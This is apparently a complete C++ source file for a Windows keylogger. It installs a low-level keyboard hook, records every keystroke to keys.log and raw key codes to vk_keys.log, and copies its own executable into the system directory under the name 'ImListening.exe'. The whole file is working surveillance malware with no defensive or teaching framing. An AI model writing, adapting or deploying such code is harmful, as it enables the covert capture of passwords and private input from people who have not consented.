#include <fstream>
#include <iostream>
#include <windows.h>
#include <string>

using namespace std;

HHOOK hKeyHook;
KBDLLHOOKSTRUCT kbdStruct;

BYTE keyState[256];
WCHAR buffer[16];

char systemPath[MAX_PATH];
char pathtofile[MAX_PATH];

HMODULE GetModH = GetModuleHandle(NULL);


//function that returns executable path
string getExePath(){
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of( "\\/" );
	return string(buffer).substr(0, pos);
}


//function that triggers on keypress
LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam){
	
	//on key pressed
	if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))){
		
		//output files
		ofstream LOG("keys.log",  ios_base :: app | ios_base :: out);
		ofstream VKLOG("vk_keys.log",  ios_base :: app | ios_base :: out);
		
		//captured key
		kbdStruct = *((KBDLLHOOKSTRUCT*) lParam);
		
		//decode vkey and write it to logfile
		switch((unsigned int) kbdStruct.vkCode){
			case 0xA1:
				LOG << "[right shift down]";
			break;
			
			case 0xA0:
				LOG << "[shift down]";
			break;
			
			case 0x8:
				LOG << "[backspace]";
			break;
			
			case 0xD:
				LOG << "[enter]";
			break;
			
			case 0x1B:
				LOG << "[esc]";
			break;
			
			case 0x9:
				LOG << "[tab]";
			break;
			
			case 0x2E:
				LOG << "[delete]";
			break;
			
			case 0xA4:
				LOG << "[alt]";
			break;
			
			case 0x25:
				LOG << "[left]";
			break;
			
			case 0x26:
				LOG << "[up]";
			break;
			
			case 0x27:
				LOG << "[right]";
			break;
			
			case 0x28:
				LOG << "[down]";
			break;
			
			case 0xA2:
			case 0xA3:
				LOG << "[ctrl]";
			break;
			
			default:
				GetKeyboardState((PBYTE) &keyState);
				ToUnicode(kbdStruct.vkCode, kbdStruct.scanCode, (PBYTE) &keyState, (LPWSTR) &buffer, sizeof(buffer) / 2, 0);
				LOG << buffer[0];
			break;
		}
		
		//log hex vkey
		VKLOG << hex << uppercase << kbdStruct.vkCode << endl;
		
		//close output files
		VKLOG.close();
		LOG.close();
	}
	
	//on key released
	if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP))){
		kbdStruct = *((KBDLLHOOKSTRUCT*) lParam);
		ofstream LOG("keys.log", ios_base :: app | ios_base :: out);
		
		switch((unsigned int) kbdStruct.vkCode){
			case 0xA1:
				LOG << "[right shift up]";
				break;
			case 0xA0:
				LOG << "[left shift up]";
				break;
		}
		
		LOG.close();
	}
	
	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

//main function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow){
	
	//hook keyboard
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
	
	MSG message;
	
	//get file name, file path and system path
	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
	GetSystemDirectory(systemPath, sizeof(systemPath));
	const char *exePath = getExePath().c_str();
	
	cout << "checking...\nexePath: " << exePath <<"\nsystemPath: " << systemPath << endl;
	
	//if file not in system path, copy itself into it
	if(strcmp(systemPath, exePath) != 0){
		strcat(systemPath, "\\ImListening.exe");
		CopyFile(pathtofile, systemPath, false);
		cout << "moved to: " << systemPath << "\nfrom: " << pathtofile << endl;
	}
	
	//start capturing keys
	while(GetMessage(&message, NULL, 0, 0)){
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
	
	//unhook before closing
	UnhookWindowsHookEx(hKeyHook);
	return 0;
}
